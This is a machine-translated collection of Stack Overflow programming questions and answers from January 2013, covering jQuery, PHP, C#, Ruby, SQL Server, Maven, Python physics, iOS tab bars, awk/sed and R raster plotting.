    columns:[
    {
        headerTemplate:'<input id="masterCheck" class="check" type="checkbox" /><label for="masterCheck"></label>', 
        template: '<input id="${id}" type="checkbox" />',
        filterable: false,
        width: 33,
        sortable: false // may want to make this sortable later. will need to build a custom sorter.
    },
        {field: 'test',
         sortable: true}
    ]});

var grid = $('#grid').data().kendoGrid;
$('#grid tbody').on('click',':checkbox',function(){   
    var id = grid.dataItem($(this).closest('tr')).id;
    if($(this).is(':checked')){        
        array[id] = true;
    }else{
        array[id] = false;
    }
}) 
```

[链接](http://jsfiddle.net/e6shF/34/)到小提琴

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-01-23T00:19:28.083

如果您不太在意旧浏览器 HTML5 存储可能适合您 [http://www.w3schools.com/html/html5_webstorage.asp](http://www.w3schools.com/html/html5_webstorage.asp) 当然 jQuery 具有自己的数据存储功能。

# javascript - jQuery/CSS 按钮未按预期运行

> ID：14469709
> 
> 赞同：0
> 
> 时间：2013-01-22T23:05:24.660
> 
> 标签：javascript, jquery, css, jplayer

我有一个从[本教程](http://www.hongkiat.com/blog/css3-on-off-button/)中获取的开/关按钮，并在我的 jPlayer 页面上实现了该按钮。

*   正如您在教程中看到的，按钮有两种状态：按下和未按下
*   我使用修改后的 Player 的 jquery 文件在我的页面上实现了按钮。

如果我尝试在 index.html 中实现它，它会变为按下但不会播放，如果我在 jQuery 中实现它，它不会变为按下但会播放。

这是我里面的代码`metroplayer.js`：

```
$(document).ready(function(){
            $('#button').on('click', function(){
                $(this).toggleClass('on');
            });
        });

(function($){
    $.fn.extend({

        metroPlayer: function(options) {

            var defaults = {

            }

            var options =  $.extend(defaults, options);

            return this.each(function() {
                obj = $(this);
                o = options;

                $template = $('<div id="metro-wrapper">'+
                '<div id="metro-left-overlay"></div>'+
                '<div id="jp_container_N" class="">'+
                '<div id="jquery_jplayer_N" class="jp-jplayer"></div>'+
                '<div class="jp-gui">'+
                '<div class="jp-interface">'+
                '<div id="metro-left">'+
                '<div id="metro-controls">'+
                '<ul>'+
                //'<li id="metro-prev" class="jp-prev"><img src="img/prev.png" /></li>'+
                '<section><a id="button" class="onoffbutton jp-play" href="#">&#xF011;</a>'+
                '<span></span>'+
                '</section>'+ 
```

阻止按钮以“按下”模式出现的代码有什么问题？

这是我的播放器[页面](http://www.tranceil.fm/player2)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:25:12.147

你还没有`jPlayer( "play" );`在你的点击事件上实现实际的。我想你想做的是

```
$('#button').on('click', function(){
    $(this).toggleClass('on');
    $musicPlayer.jPlayer({ //whatever json you want })("play");
}); 
```

或类似的东西。这意味着您必须将此事件绑定移动到 AFTER setup your player on `$musicPlayer`，因此请确保您这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:11:22.563

只需将 css 类添加到您的按钮元素不会触发 jPlayer 元素开始播放。尝试在你的点击事件函数中添加这个：

```
if( $(this).hasClass("on") ){
    $(yourplayerid).jPlayer( "play" );
} else {
    $(yourplayerid).jPlayer( "stop" );
} 
```

来源： [http ://www.jplayer.org/latest/developer-guide/#jPlayer-play](http://www.jplayer.org/latest/developer-guide/#jPlayer-play)

# php - 使用 sscanf 扫描特殊字符串

> ID：14469713
> 
> 赞同：0
> 
> 时间：2013-01-22T23:05:37.083
> 
> 标签：php, scanf

例如，我想`$lang['foo1']='foo2';`从 PHP 文件中扫描它，所以我尝试了这个，但它不起作用。

```
$file = "../lang/lang.en.php"; 

if(file_exists($file)) {
    $text = fopen($file, 'r+');
    $content = trim(file_get_contents($file, NULL, NULL, 221)); 
    $i = 0;
    do {
        $n = sscanf($content, "\$lang['%s']=%s;", $s1[$i], $s2[$i]);
        echo $s1[$i].'==>'.$s2[$i];
        $i++;
    } while($s1[$i]! = '' && $s2[$i] != '');
} 
```

我的问题是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:09:24.377

你应该`include('../lang/lang.en.php')`就像一个普通的 PHP 文件。

此外，可以使用[http://nl3.php.net/manual/en/function.return.php](http://nl3.php.net/manual/en/function.return.php)`lang.en.php`直接返回一个数组`return`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:13:56.380

我建议[`preg_match_all()`](http://php.net/manual/function.preg-match-all.php)在您的情况下使用。

```
// Match 
// $lang['PAGE_TITLE']='Meine Webseite Titel';

$content = file_get_contents('../lang/lang.en.php');
preg_match_all("~\$lang\['.+'\]\s=\s'.+';~", $content, $result);

var_dump($result); 
```

# c# - 尝试使用自定义事件时出错

> ID：14469718
> 
> 赞同：0
> 
> 时间：2013-01-22T23:05:51.403
> 
> 标签：c#, winforms, custom-events

我正在尝试使用[Passing-Data-between-Windows-Forms](http://www.codeproject.com/Articles/17371/Passing-Data-between-Windows-Forms)白皮书中的信息来编写一些自定义事件以在表单之间传递信息。不幸的是，当我试图提出这个事件时
，我一直得到一个。`NullReferenceException`下面是我目前尝试的相关代码的缩小版本。
有人可以看看，如果我遗漏了什么，请告诉我？
顺便说一句，如果这有所作为，我正在使用 DevExpress 表单。我只包含了生成我的自定义事件的类，因为那是代码失败的地方。在`NullReferenceException`发生的行上，我已验证该项目不是`null`.

```
// Class that generates custom event
public partial class DiscountItemControl : DevExpress.XtraEditors.XtraUserControl
{
    // Add a delegate
    public delegate void ItemInsertedEventHandler(object sender, ItemInsertedEventArgs e);

    // AddCustomerForm an event of the delegate type
    public event ItemInsertedEventHandler ItemInsertedEvent;

    public void SaveAndClose()
    {
        // setup event args
        ItemInsertedEventArgs args = new ItemInsertedEventArgs(currentDiscountItem);

        // ********** THIS THROWS NullReferenceException *********
        // raise the event to notify listeners
        ItemInsertedEvent(this, args);

        this.Dispose();
    }
}

// Event arguments for event
public class ItemInsertedEventArgs : System.EventArgs
{
    private Item item;

    public ItemInsertedEventArgs(Item item)
    {
        this.item = item;
    }

    public Item InsertedItem
    {
        get
        {
            return this.item;
        }
    }
} 
```

* * *

```
System.NullReferenceException was unhandled by user code   Message="Object reference not set to an instance of an object."   Source="PureService"   StackTrace:
at MarineService.Tests.DiscountItemControl.SaveAndClose(Boolean& result) in C:\Aaron\Dev\HIGH PRIORITY\ServiceModule\MarineService\ServiceModule\UtilityClasses\UserControls\Items\DiscountItemControl.cs:line 336
at MarineService.Tests.AddEditItemForm.btnSaveAndClose_Click(Object sender, EventArgs e) in C:\Aaron\Dev\HIGH PRIORITY\ServiceModule\MarineService\ServiceModule\AddEditItemForm.cs:line 326
at System.Windows.Forms.Control.OnClick(EventArgs e)
at DevExpress.XtraEditors.BaseButton.OnClick(EventArgs e)
at DevExpress.XtraEditors.BaseButton.OnMouseUp(MouseEventArgs e)
at System.Windows.Forms.Control.WmMouseUp(Message& m, MouseButtons button, Int32 clicks)
at System.Windows.Forms.Control.WndProc(Message& m)
at DevExpress.Utils.Controls.ControlBase.WndProc(Message& m)
at DevExpress.XtraEditors.BaseControl.WndProc(Message& msg)
at System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message& m)
at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)
at System.Windows.Forms.NativeWindow.Callback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam)   InnerException: 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T23:08:13.410

您可能没有该活动的任何订阅者。如果是这种情况，支持您的事件的委托字段将具有空值。你应该检查一下，像这样：

```
ItemInsertedEventHandler handler = ItemInsertedEvent;
if (handler != null)
{
    handler(this, args);
} 
```

使用局部变量的原因是为了避免竞争条件，即在检查*之后*但调用之前删除最后一个处理程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:08:30.350

您没有附加任何事件处理程序。通常自定义事件代码会检查：

```
ItemInsertedEventHandler handler = this.ItemInsertedEvent;
if(handler != null) handler(this, args); 
```

您需要在某处添加一些代码来添加处理程序，即

```
MyObject.ItemInsertedEvent += myHandler; 
```

编辑： Jon Skeet 关于比赛条件问题是正确的，你应该像他建议的那样使用局部变量。我已经改变了我的例子来匹配。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:09:22.793

这是因为事件发生`null`在你调用它的时候。您需要检查它是否`null`事先：

```
if (ItemInsertedEvent != null) {
    ItemInsertedEvent(this, args);
} 
```

# c# - 将 GridView 和 ObjectDataSource 与泛型一起使用

> ID：14469728
> 
> 赞同：0
> 
> 时间：2013-01-22T23:06:37.097
> 
> 标签：c#, asp.net, generics, repository, objectdatasource

我正在设计一个内部企业应用程序来管理使用 ASP.NET (C#)、nHibernate 和后面的 SQL Server 的小型企业贷款。

从我所做的大部分阅读来看，为每个域对象拥有单独的存储库（以及单独的服务层对象）似乎是相当普遍的做法——这对我来说似乎有点过分和开销。

考虑到这一点，我有一个基本的存储库接口和一个基于该接口的通用存储库类，用于除了基本 CRUD 操作（使用 ISession 和 ITransaction 处理）之外没有“特殊要求”的域对象，代码省略）

```
// Repository interface:
public partial interface IRepository<T>
{
    void Add(T entity);
    void Update(T entity);
    void Remove(T entity);
    ICollection<T> GetAll();
    T GetByKey(int _ID);
}

// Generic repository - basic CRUD for most domain objects
public partial class BaseRepository<T> : IRepository<T>
{
    protected ISession session;
    ...

    public virtual void Add(T entity)
    { ... }
    public virtual void Update(T entity)
    { ... }
    public virtual void Remove(T entity)
    { ... }
    public virtual ICollection<T> GetAll()
    { ... }
    public virtual T GetByKey(int _ID)
    { ... }
} 
```

如前所述`<type>`，我希望能够使用这个`BaseRepository`类作为 的业务对象，而不是为几十个存储库提供几乎相同的代码`ObjectDataSource`，但它没有显示为可用选项“配置数据源”对话框。

甚至可以为此目的使用泛型吗？对于那里的任何 ASP.NET MVC 大师 - 使用该框架而不是 ASP.NET 更容易处理这个问题吗？

# ruby - 当最大深度已知时，给 `Array#flatten` 一个参数会更好吗？

> ID：14469730
> 
> 赞同：1
> 
> 时间：2013-01-22T23:06:52.370
> 
> 标签：ruby, arrays

当你想一直展平一个数组时，数组的最大深度是已知的，在性能方面总是将最大深度作为参数传递给`Array#flatten`? 例如，在下面做前者比做后者更好吗？

```
[[:foo], [:bar], [:baz], ...].flatten(1)

[[:foo], [:bar], [:baz], ...].flatten 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T23:49:31.550

不在 MRI 上，因为无论您是否设置级别，都会检查元素是否为数组。它本质上是这样做的（psuedo-Ruby，如果你想要原始的 C，它从[这里](https://github.com/ruby/ruby/blob/trunk/array.c#L4148)开始）

```
array.each do |value|
  if !value.is_array? || current_depth >= max_depth
    result << value
  else
    current_depth += 1
    recurse ...
  end
end 
```

实际的实现不是显式递归的，也没有`is_array?`方法，但是嘿，你明白了。

带回家的信息是您的用例将始终满足`!value.is_array?`条件，并且永远不会使用您传递的参数，因此您不会通过传递它获得任何收益。

# tsql - 从 SQL Server CE 中的字符串列中删除最后一个字符

> ID：14469733
> 
> 赞同：7
> 
> 时间：2013-01-22T23:07:12.883
> 
> 标签：tsql, sql-server-ce

在 SQL Server Compact 中，我试图删除一个尾随逗号，该逗号来自影响一列数千行的错误`NVARCHAR`。

```
UPDATE myTable 
SET col = LEFT(col, LEN(col)-1) 
WHERE col LIKE '%,'; 
```

抛出错误：

> *解析查询时出错。[ 错误令牌 = LEFT ]*

SQL Server CE 不能解析该查询吗？或者，有人可以提供另一种方法吗？

注意：我在[CompactView](http://sourceforge.net/projects/compactview/)中尝试过，我不确定这是否是问题所在。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-01-23T06:30:46.137

基于[这个例子](https://stackoverflow.com/a/1256924/434034)，我能够使用[SUBSTRING](http://msdn.microsoft.com/en-us/library/ms187748.aspx)完成它：

```
UPDATE myTable
SET col = SUBSTRING(col, 0, LEN(col))
WHERE col LIKE '%,'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-04-03T15:23:43.897

建议的 using 解决方案`SET col = SUBSTRING(col, 0, LEN(col))`有点不清楚。

这是SUBSTRING第二个参数starting_position是“基于1”的副作用。所以在这种情况下 0 是一种负数（您也可以使用即 -3 和 4 个字符将被剥离而不是 1）。恕我直言，使用它会更清楚：

`UPDATE myTable SET col = SUBSTRING(col, 1, LEN(col)-1) WHERE col LIKE '%,';`

这显示了代码的意图

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-29T16:15:28.373

```
 UPDATE myTable
    SET col = SUBSTR(col, 0, (LENGTH(col) - 1))
    WHERE col LIKE '%,'; 
```

# android - 在错误的目录中找到 Jarsigner - HoloEverywhere + Maven

> ID：14469737
> 
> 赞同：1
> 
> 时间：2013-01-22T23:07:17.143
> 
> 标签：android, maven-3, m2eclipse, jarsigner, android-holo-everywhere

我目前正在尝试使用此页面上的指南构建我的 holoeverywhere 项目。 [https://github.com/ChristopheVersieux/HoloEverywhere/wiki/Maven](https://github.com/ChristopheVersieux/HoloEverywhere/wiki/Maven)

但是，当我尝试构建我的项目时，它最终会导致关于 jarsigner 的构建失败。

这是错误：

```
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 50.529s
[INFO] Finished at: Tue Jan 22 17:44:51 EST 2013
[INFO] Final Memory: 18M/139M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-jarsigner-plugin:1.2:sign (default) on project library: Failed executing 'cmd.exe /X /C ""C:\Program Files\Java\jdk1.7.0_11\jre\..\bin\jarsigner.exe" -sigalg MD5withRSA -digestalg SHA1 -keystore C:\Users\Akhil\.'*****'\debug.keystore -storepass '*****' -keypass '*****' C:\Users\Akhil\HoloEverywhere\library\target\library-1.4.2.apklib '*****'debugkey"' - exitcode 1 -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException 
```

我去了它试图找到 jarsigner.exe 的目录，但它不存在！所以我在 C:\Program Files\Java\jdk1.7.0_11\bin\ 中找到了它，并意识到它的 jarsigner.exe 位置错误。

我尝试使用谷歌搜索标签以包含在 pom.xml 中以指定 jarsigner 的位置。我什至为 jdk 安装、jarsigner（在 JARSIGNERLOCATION 中）等等正确设置了路径变量……

**我的问题是，我在哪里设置 jarsigner.exe 的位置以便构建器找到该文件？**

这是我的 pom.xml 供参考。

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
<modelVersion>4.0.0</modelVersion>

<artifactId>library</artifactId>
<name>HoloEverywhere Library</name>
<packaging>apklib</packaging>

<parent>
    <groupId>org.holoeverywhere</groupId>
    <artifactId>parent</artifactId>
    <version>1.4.2</version>
</parent>

<dependencies>
    <dependency>
        <groupId>com.google.android</groupId>
        <artifactId>android</artifactId>
    </dependency>
    <dependency>
        <groupId>com.actionbarsherlock</groupId>
        <artifactId>actionbarsherlock</artifactId>
        <type>apklib</type>
    </dependency>
    <dependency>
        <groupId>com.google.android</groupId>
        <artifactId>support-v4</artifactId>
        <version>r7</version>
    </dependency>
</dependencies>

<build>
    <sourceDirectory>src</sourceDirectory>
    <testSourceDirectory>test</testSourceDirectory>

    <plugins>
        <plugin>
            <groupId>org.holoeverywhere</groupId>
            <artifactId>builder</artifactId>
            <configuration>
                <input>
                    <param>styles.json</param>
                    <param>styles-v14.json</param>
                </input>
            </configuration>
        </plugin>

        <plugin>
            <groupId>org.holoeverywhere</groupId>
            <artifactId>translator</artifactId>
            <configuration>
                <input>
                    <param>strings.json</param>
                </input>
            </configuration>
        </plugin>

        <plugin>
            <groupId>com.jayway.maven.plugins.android.generation2</groupId>
            <artifactId>android-maven-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-jarsigner-plugin</artifactId>
            <inherited>true</inherited>
        </plugin>
    </plugins>

    <pluginManagement>
        <plugins>
            <plugin>
                <groupId>org.eclipse.m2e</groupId>
                <artifactId>lifecycle-mapping</artifactId>
                <version>1.0.0</version>
                <configuration>
                    <lifecycleMappingMetadata>
                        <pluginExecutions>
                            <pluginExecution>
                                <pluginExecutionFilter>
                                    <groupId>org.holoeverywhere</groupId>
                                    <artifactId>builder</artifactId>
                                    <versionRange>[1.4.0,)</versionRange>
                                    <goals>
                                        <goal>build</goal>
                                    </goals>
                                </pluginExecutionFilter>
                                <action>
                                    <execute />
                                </action>
                            </pluginExecution>
                            <pluginExecution>
                                <pluginExecutionFilter>
                                    <groupId>org.holoeverywhere</groupId>
                                    <artifactId>translator</artifactId>
                                    <versionRange>[1.4.0,)</versionRange>
                                    <goals>
                                        <goal>build</goal>
                                    </goals>
                                </pluginExecutionFilter>
                                <action>
                                    <execute />
                                </action>
                            </pluginExecution>
                        </pluginExecutions>
                    </lifecycleMappingMetadata>
                </configuration>
            </plugin>
        </plugins>
    </pluginManagement>
</build>

<profiles>
    <profile>
        <id>release</id>
        <activation>
            <property>
                <name>performRelease</name>
                <value>true</value>
            </property>
        </activation>
        <build>
            <plugins>
                <plugin>
                    <groupId>com.jayway.maven.plugins.android.generation2</groupId>
                    <artifactId>android-maven-plugin</artifactId>
                    <extensions>true</extensions>
                    <executions>
                        <execution>
                            <id>manifestUpdate</id>
                            <phase>process-resources</phase>
                            <goals>
                                <goal>manifest-update</goal>
                            </goals>
                        </execution>
                    </executions>
                    <configuration>
                        <manifest>
                            <versionName>${project.version}</versionName>
                        </manifest>
                        <sign>
                            <debug>false</debug>
                        </sign>
                    </configuration>
                </plugin>

                <plugin>
                    <groupId>org.codehaus.mojo</groupId>
                    <artifactId>build-helper-maven-plugin</artifactId>
                    <configuration>
                        <artifacts>
                            <artifact>
                                <file>${project.build.directory}/${project.artifactId}-${project.version}.jar</file>
                                <type>jar</type>
                            </artifact>
                        </artifacts>
                    </configuration>
                    <executions>
                        <execution>
                            <phase>package</phase>
                            <goals>
                                <goal>attach-artifact</goal>
                            </goals>
                        </execution>
                    </executions>
                </plugin>
            </plugins>
        </build>
    </profile>
</profiles> 
```

谢谢！！！！！

# python - Python台球碰撞响应我的公式有一些角度问题

> ID：14469738
> 
> 赞同：0
> 
> 时间：2013-01-22T23:07:25.753
> 
> 标签：python, collision-detection, physics, billiards

这是我的碰撞响应代码，用于模拟 2 个移动球碰撞的台球。我使用牛顿方程定律，然后对速度矢量的分量进行参数化，

Alpha 是球 1
的轨迹 Beta 是球 2 的轨迹
Theta 是中心线相对于轴的角度

我的想法是在 2 个球的局部框架中为碰撞响应提出一个通用公式，然后将其重新投影回我的固定框架，但我注意到存在一些角度问题，我无法弄清楚我的生活是什么条件应该是 ie alpha

最后一点只是为了确保球在碰撞后不会重叠并陷入无限循环的碰撞

```
 def collision(b1,b2):

        dx=b1.x-b2.x
        dy=b1.y-b2.y
        Theta = atan2(dy,dx)
        Vx1=b1.speedx
        Vy1=b1.speedy

        Vx2=b2.speedx
        Vy2=b2.speedy

        V1 = sqrt((Vx1)**2+(Vx1)**2)
        V2 = sqrt((Vx2)**2+(Vx1)**2)
        Alpha = asin(Vx1/V1)
        Beta = asin(Vx2/V2)

       b1.speedx = (((1-e)/2)*V1*sin(Alpha-Theta) - ((1+e)/2)*V2*sin(Beta-Theta))*sin(Theta) - V1*cos(Alpha-Theta)*cos(Theta)
       b1.speedy = (((1-e)/2)*V1*sin(Alpha-Theta) - ((1+e)/2)*V2*sin(Beta-Theta))*cos(Theta) + V1*cos(Alpha-Theta)*sin(Theta)
       b2.speedx = (((1+e)/2)*V1*sin(Alpha-Theta) - ((1-e)/2)*V2*sin(Beta-Theta))*sin(Theta) + V2*cos(Beta-Theta)*cos(Theta)
       b2.speedy = (((1+e)/2)*V1*sin(Alpha-Theta) - ((1-e)/2)*V2*sin(Beta-Theta))*cos(Theta) - V2*cos(Beta-Theta)*sin(Theta) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:11:39.560

不要使用 asin 来计算角度。如果你坚持使用角度（而不是向量），你应该使用 atan2。

# xcode - 我需要自定义tabBar

> ID：14469740
> 
> 赞同：0
> 
> 时间：2013-01-22T23:07:42.787
> 
> 标签：xcode, customization, uitabbar, tabbar

在我的项目中，我有两个带有 TabBar 的视图，我想用不同的图像自定义每个视图。

谁能知道该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T11:30:29.250

Osvaldo，如果您希望标签栏项目的两个不同视图控制器具有两种不同的背景，您有几个选择。但我会做以下事情。从对象库中获取一个 UIView 并在每个 vc 中放置一个，以便它填充整个视图。接下来可以将 UIImageViews 放置在刚刚放置的 UIView 中。一个vc中有四个，另一个中有五个。放置它们并将它们调整为您想要的大小。然后，您需要导入要放置在其中的图片。将图像文件拖到左侧窗格中，即项目大纲。确保您复制到目的地，以便它们成为您项目的一部分。接下来在 vc 中单击您想要图片的 UIImageView。在属性下的右窗格中，将有一个名为 image 的下拉菜单。选择您想要的图像，它将出现在 vc 的情节提要中。对您拥有的所有 UIImageView 执行此操作。在情节提要上时，您可以弹出情节提要大纲。确保 UIImageViews 在 UIView 中。然后选择大纲中的 UIView 并转到编辑器菜单，然后选择排列，发送到后面。如果 UIView 是你一开始在 vc 上唯一的东西，它可能会变灰。所以现在，这个 UIView 将作为背景，你可以自定义它们看起来像你喜欢的任何东西。希望这会有所帮助，让我们知道它是怎么回事。如果可行，请接受我的回答，任何其他问题，尽管问。如果 UIView 是你一开始在 vc 上唯一的东西，它可能会变灰。所以现在，这个 UIView 将作为背景，你可以自定义它们看起来像你喜欢的任何东西。希望这会有所帮助，让我们知道它是怎么回事。如果可行，请接受我的回答，任何其他问题，尽管问。如果 UIView 是你一开始在 vc 上唯一的东西，它可能会变灰。所以现在，这个 UIView 将作为背景，你可以自定义它们看起来像你喜欢的任何东西。希望这会有所帮助，让我们知道它是怎么回事。如果可行，请接受我的回答，任何其他问题，尽管问。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T04:41:24.220

如果您希望自定义标签栏中的标签，可以通过使用下面的 init 方法创建一个 UITabBarItem 并将其分配给进入标签栏控制器的每个导航控制器的 tabBarItem 属性来完成。这将在每个选项卡上显示给定的标题和图像。

```
navigationController.tabBarItem = [[UITabBarItem alloc] initWithTitle:@"title"
                                      image:[UIImage imageNamedB:@"tabImage.png"]
                                        tag:0]; 
```

# php - 在 PHP 中获取 iframe 的 URL

> ID：14469746
> 
> 赞同：-1
> 
> 时间：2013-01-22T23:08:09.323
> 
> 标签：php, iframe

我有一个 iframe，我需要获取它的实际 URL (src) 以将其放入 PHP 变量中。最简单的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:59:32.463

使用 jQuery 之类的东西读取 iFrame SRC 属性并通过 AJAX 将其发送到可以处理它的 PHP 脚本怎么样？

```
<div id="message">message</div>
<iframe src="http://google.ca"> 
```

```
$(document).ready(function () {
    var iframe_src = $('iframe').attr('src');
    $('div#message').html(iframe_src);
    //$.load('file.php?src=' + iframe_src);
}); 
```

快速演示：http: [//jsfiddle.net/hansvedo/DNkE3/](http://jsfiddle.net/hansvedo/DNkE3/)

# shell - 需要用file1中的字符串替换file2中的一个字符

> ID：14469751
> 
> 赞同：-1
> 
> 时间：2013-01-22T23:08:34.197
> 
> 标签：shell, sed, awk

这是我想要做的。

文件1：

```
abc
bcd
cde
def
efg
fgh
ghi 
```

文件2：

```
ip:/vol0/scratch/&
ip:/vol0/sysbuild/
ip:/vol0/cde
ip:/vol0/mnt/cm/&
ip:/vol0/&
ip:/vol0/mnt/fgh
ip:/vol0/mnt/& 
```

如您所见`File2`，`&`在某些行的末尾有，我需要`&`用相应的行替换`File1`并忽略没有的行 `&` 例如，如果第 2 行和第 3 行没有`&`脚本将跳过第 2 行和第 3 行文件并转到第 4 行以替换`&`

我将如何使用 shell 脚本来实现这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:19:24.050

使用`paste`和`awk`：

```
$ paste file2 file1 | awk 'sub(/&\s+/,"")'
ip:/vol0/scratch/abc
ip:/vol0/mnt/cm/def
ip:/vol0/efg
ip:/vol0/mnt/ghi 
```

* * *

如果您希望这些行不在`&`输出中结束，则不是 100% 清楚：

```
$ paste file2 file1 | awk '{sub(/&\s+/,"");print $1}'
ip:/vol0/scratch/abc
ip:/vol0/sysbuild/
ip:/vol0/cde
ip:/vol0/mnt/cm/def
ip:/vol0/efg
ip:/vol0/mnt/fgh
ip:/vol0/mnt/ghi 
```

与`sed`：

```
$ paste file2 file1 | sed -rn '/&/s/&\s+//p'
ip:/vol0/scratch/abc
ip:/vol0/mnt/cm/def
ip:/vol0/efg
ip:/vol0/mnt/ghi 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:30:44.753

```
awk 'NR==FNR{a[NR]=$0;next} sub(/&/,a[FNR])' file1 file2 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:59:54.833

```
paste file1 file2 | awk 'gsub( /&/, $1 )' | cut -f2- 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-23T02:04:46.483

试试这个

```
awk '{if (NR == FNR){f[NR]= $0;}else {gsub("&",f[FNR],$0); print $0}}' file1.txt file2.txt 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-23T11:21:14.663

这可能对您有用（GNU sed）：

```
sed = file1 | sed -r 'N;s/(.*)\n(.*)/\1s|\&$|\2|/' | sed -f - file2 
```

1.  `sed = file1`生成行号
2.  `sed -r 'N;s/(.*)\n(.*)/\1s|\&$|\2|/'`将行号与数据行结合起来，并使用行号作为地址生成一个 sed 替换命令。
3.  `sed -f - file2``-f`使用开关和标准输入将上述命令输入到 sed 调用中`-`

# r - 如何删除 R 包“raster”中“plot.raster”中的框框

> ID：14469753
> 
> 赞同：18
> 
> 时间：2013-01-22T23:08:56.053
> 
> 标签：r, plot, spatial, raster

我需要删除 R 包“raster”中图形周围的框框，但我不知道应该更改哪个参数。示例如下：

```
library(raster)

r <- raster(nrows=10, ncols=10)

r <- setValues(r, 1:ncell(r))

plot(r)

plot(r,axes=F) 
```

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2013-01-22T23:39:37.443

这有效：

```
plot(r, axes=FALSE, box=FALSE) 
```

要了解如何自己发现这一点，请尝试以下操作来查看底层函数。（因为**raster**包大量使用 S4 方法而不是更常用的 S3 方法，所以需要调用`showMethods()`和。）`getMethod()`

 **```
showMethods("plot")
getMethod("plot", c("Raster", "ANY"))
getAnywhere(".plotraster2")
getAnywhere(".rasterImagePlot")
args(raster:::.rasterImagePlot)
# function (x, col, add = FALSE, legend = TRUE, horizontal = FALSE, 
#     legend.shrink = 0.5, legend.width = 0.6, legend.mar = ifelse(horizontal, 
#         3.1, 5.1), legend.lab = NULL, graphics.reset = FALSE, 
#     bigplot = NULL, smallplot = NULL, legend.only = FALSE, lab.breaks = NULL, 
#     axis.args = NULL, legend.args = NULL, interpolate = FALSE, 
#     box = TRUE, breaks = NULL, zlim = NULL, zlimcol = NULL, fun = NULL, 
#     asp, colNA = NA, ...) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:28:39.320

我能建议的最好的是

```
plot(r,axes=F,useRaster=F) 
```

该选项`bty='n'`通常会摆脱该框，但光栅绘图功能似乎在您无法摆脱的常规框之上绘制自己的框。**

# sql - TSQL 错误检查代码不起作用

> ID：14469756
> 
> 赞同：1
> 
> 时间：2013-01-22T23:09:15.367
> 
> 标签：sql, sql-server, tsql, error-handling, transactions

当在视图中执行查询出错时，我正在尝试向我的日志添加一个警报，以便将视图运行插入表中。当我单独运行视图时，我在 SUBSTRING 中得到一个无效的输入（我不记得错误的确切措辞）。当我将它作为视图的一部分运行时-> 表存储过程，该错误被忽略，然后我必须去挖掘有问题的行并在视图的代码中创建一个异常以从结果中省略该行（我知道，它听起来很杂乱，但我正在从专门的 web 应用程序中对巨大的 web 日志文件进行数据缩减），但我离题了。

我尝试了两种不同的方法来尝试捕获错误，但都没有以在我的执行结果表 (refresh_results) 中插入指示错误的行的方式触发。我想我可能遗漏了一些基本知识——也许错误正在以某种方式被封装。如果我无法检测到错误，那么注意到错误的唯一方法是如果有人注意到表中的条目数在给定的时间段内很低。

```
 SELECT @TransactionName = 'tname';
    BEGIN TRANSACTION @TransactionName;
    BEGIN TRY
      print 'tname ***In Try***';
      if exists (select name from sysobjects where name='tablename')
      begin
        drop table tablename;
      end
      select * into tablename 
      from opendatasource('SQLNCLI', 'Data Source=DATABASE;UID=####;password=####').dbo.viewname;
      COMMIT TRANSACTION @TransactionName;
    END TRY
    BEGIN CATCH 
      print 'tablename ***ERROR - check for SUBSTRING***';
      begin transaction
      set   @result_table = 'tablename ***ERROR - check for SUBSTRING***'
      select    @result_time = getdate(),
            @result_rows = count(logtime)
      from tablename
      insert INTO   [dbo].[refresh_results] (result_time, result_table, result_rows)
                values (@result_time, @result_table, @result_rows);
      commit transaction
      ROLLBACK TRANSACTION @TransactionName;
    END CATCH 
```

或者

```
 if exists (select name from sysobjects where name='tablename')
    begin
      drop table tablename;
    end
    select * into tablename 
    from opendatasource('SQLNCLI', 'Data Source=DATABASE;UID=####;password=####').dbo.viewname;

    print '@@error' 
print @@error

if @@error <> 0 
Begin
      print 'tablename ***ERROR - check for SUBSTRING***';
      set     @result_table = 'tablename ***ERROR - check for SUBSTRING***'
      select  @result_time = getdate(),
          @result_rows = count(logtime)
      from tablename
